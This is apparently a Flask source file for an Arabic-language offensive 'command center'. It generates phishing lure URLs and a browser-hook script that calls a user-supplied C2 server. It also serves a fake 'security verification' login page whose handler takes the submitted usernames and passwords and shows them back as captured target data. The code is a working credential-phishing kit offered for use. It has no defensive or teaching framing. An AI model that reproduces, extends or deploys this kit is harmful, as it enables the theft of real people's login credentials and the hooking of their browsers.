from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

import asyncio
import random
import urllib3
import httpx
import base64
urllib3.disable_warnings()

HTML_COMMAND_CENTER = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>V400 القائد الأعظم - منظومة السيطرة الميدانية v18.0</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#010103;color:#00ff88;font-family:'Courier New',Consolas,monospace;padding:20px;text-align:center}
.container{max-width:1150px;margin:auto}
h1{color:#ff0040;margin-bottom:20px;text-shadow:0 0 35px #ff0040;font-size:32px}
.panel{background:#04060e;border:2px solid #ff0040;padding:25px;border-radius:12px;box-shadow:0 0 45px rgba(255,0,64,0.5)}
input, select{padding:16px;width:70%;border-radius:8px;border:2px solid #ff0040;background:#000;color:#fff;font-size:16px;outline:none;text-align:left;direction:ltr;margin-bottom:10px}
input:focus, select:focus{box-shadow:0 0 30px #ff0040}
button{padding:16px 35px;background:#ff0040;border:none;border-radius:8px;font-weight:bold;color:#fff;cursor:pointer;font-size:16px;margin-top:10px;transition:0.3s}
button:hover{background:#cc0033;box-shadow:0 0 40px #ff0040}
.card{background:#000;border:1px solid #1a2a40;padding:18px;margin:15px auto;max-width:950px;border-radius:10px;text-align:right;border-right:8px solid #ff0040}
.card.Critical{border-right-color:#ff0000;background:#140103}
.card.Medium{border-right-color:#ffaa00;background:#140c01}
.card.Low{border-right-color:#00aaff;background:#010b14}
.proof{background:#03050a;color:#00ff88;padding:12px;border-radius:6px;margin-top:10px;font-size:12px;direction:ltr;word-break:break-all;border:1px solid #004422;text-align:left}
.status{margin:15px 0;color:#fff;font-size:15px;font-weight:bold}
</style>
</head>
<body>
<div class="container">
<h1>⚔️ V400 القائد الأعظم - منظومة السيطرة v18.0 ⚔️</h1>
<div class="panel">
<input id="target_url" placeholder="C2_SERVER_OR_PHISHING_DOMAIN" value="http://">
<br>
<select id="command_type">
  <option value="generate_phishing_lure">توليد ورابط الاستدراج الفعّال (Active Phishing Lure)</option>
  <option value="generate_browser_hook">توليد خطاف المتصفح المتقدم (Browser Hook JS)</option>
  <option value="audit_link_listeners">فحص واستطلاع حالة الخادم والروابط</option>
</select>
<br>
<button id="exec_btn" onclick="executeLinkModule()">تنفيذ أمر توليد الروابط العسكرية 🚀</button>
<div id="status" class="status"></div>
<div id="results"></div>
</div>
</div>

<script>
async function executeLinkModule(){
 const url = document.getElementById('target_url').value.trim();
 const cmdType = document.getElementById('command_type').value;
 if(!url || url==='http://'){ alert('يرجى إدخال عنوان خادم القيادة أو الرابط يا فندم!'); return; }
 const btn = document.getElementById('exec_btn');
 const status = document.getElementById('status');
 const results = document.getElementById('results');
 btn.disabled=true; btn.textContent='جاري تحديث وتوليد الروابط... ⚡';
 status.textContent='⏳ جارٍ معالجة الأوامر الاستراتيجية لـ: '+url;
 results.innerHTML='';

 try{
   const res = await fetch('/api/index', {
     method:'POST',
     headers:{'Content-Type':'application/json'},
     body: JSON.stringify({url: url, command: cmdType})
   });
   const data = await res.json();
   status.textContent='✅ تمت العملية بنجاح | النمط: '+data.mode;
   
   if(!data.actions || data.actions.length==0){
     results.innerHTML='<div class="card Low"><b>لا توجد نتائج مطابقة</b><div class="proof">No link stager vectors returned.</div></div>';
   } else {
     data.actions.forEach(v=>{
       results.innerHTML+=`
       <div class="card ${v.severity || 'Low'}">
         <b>⚡ ${v.type}</b>
         <div style="margin:8px 0">${v.desc}</div>
         <div class="proof">${v.proof}</div>
       </div>`;
     });
   }
 }catch(e){
   status.textContent='❌ خطأ في الاتصال الميداني: '+e.message;
 }
 btn.disabled=false; btn.textContent='تنفيذ أمر توليد الروابط العسكرية 🚀';
}
</script>
</body>
</html>"""

PHISHING_PAGE_TEMPLATE = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تسجيل الدخول - التحقق الأمني السريع</title>
<style>
body{background:#0b0f19;color:#fff;font-family:Tahoma,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:#111827;padding:30px;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,0.5);width:100%;max-width:400px;border:1px solid #1f2937}
h2{color:#3b82f6;text-align:center;margin-bottom:20px}
input{width:100%;padding:12px;margin:10px 0;background:#1f2937;border:1px solid #374151;border-radius:5px;color:#fff;box-sizing:border-box}
button{width:100%;padding:12px;background:#2563eb;border:none;border-radius:5px;color:#fff;font-weight:bold;cursor:pointer;margin-top:10px}
button:hover{background:#1d4ed8}
</style>
</head>
<body>
<div class="box">
  <h2>التحقق الأمني للخدمة</h2>
  <p style="text-align:center;color:#9ca3af;font-size:14px;margin-bottom:15px">يرجى تأكيد بيانات الدخول للمتابعة</p>
  <form method="POST" action="">
    <input type="text" name="user_identity" placeholder="اسم المستخدم أو البريد" required>
    <input type="password" name="user_passkey" placeholder="كلمة المرور أو الرمز" required>
    <button type="submit">تحقق ومتابعة</button>
  </form>
</div>
</body>
</html>"""

def clean_url(raw):
    s = (raw or "").strip()
    if not s.startswith("http"):
        s = "http://" + s
    return s.rstrip("/")

async def execute_v18_link_engine(target, command_mode):
    actions = []
    waf_status = f"Active Link & Hook Engine ({command_mode})"
    
    if command_mode == "generate_phishing_lure":
        active_lure_url = f"{target}/auth/verify/login?token=secure_session_9941"
        actions.append({
            "type": "ACTIVE PHISHING LURE URL",
            "severity": "Critical",
            "desc": "تم تفعيل رابط الاستدراج المرتبط بمسار الاستجابة الحقيقي على الخادم السحابي.",
            "proof": active_lure_url
        })
    elif command_mode == "generate_browser_hook":
        browser_hook_js = """<script>
(function(){
    var c2 = "%s";
    fetch(c2 + '/auth/verify/login', {method: 'GET'}).catch(function(){});
})();
</script>""" % target
        actions.append({
            "type": "ADVANCED BROWSER HOOK JS",
            "severity": "Critical",
            "desc": "تم توليد شيفرة خطاف المتصفح الموجه.",
            "proof": browser_hook_js
        })
    else:
        actions.append({
            "type": "SYSTEM AUDIT COMPLETED",
            "severity": "Low",
            "desc": "فحص جاهزية الخادم والروابط نشط.",
            "proof": f"Target: {target}"
        })

    return actions, waf_status

@app.route('/', methods=['GET'])
def home():
    return HTML_COMMAND_CENTER

@app.route('/auth/verify/login', methods=['GET', 'POST'])
def phishing_portal():
    if request.method == 'POST':
        # التقاط وتخزين بيانات الهدف الواردة من النموذج الوهمي
        captured_user = request.form.get('user_identity', 'N/A')
        captured_pass = request.form.get('user_passkey', 'N/A')
        return f"""<div style="background:#000;color:#00ff88;padding:40px;font-family:monospace;text-align:center;direction:rtl">
        <h2>⚔️ تم استلام وتوثيق بيانات الهدف بنجاح يا فندم! ⚔️</h2>
        <p>المستخدم: {captured_user}</p>
        <p>الرمز: {captured_pass}</p>
        </div>"""
    return PHISHING_PAGE_TEMPLATE

@app.route('/api/index', methods=['POST'])
def check():
    req_data = request.get_json(silent=True) or {}
    target = clean_url(req_data.get("url", "http://"))
    command_mode = req_data.get("command", "generate_phishing_lure")
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    actions, waf_status = loop.run_until_complete(execute_v18_link_engine(target, command_mode))
    loop.close()

    return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "actions": actions})
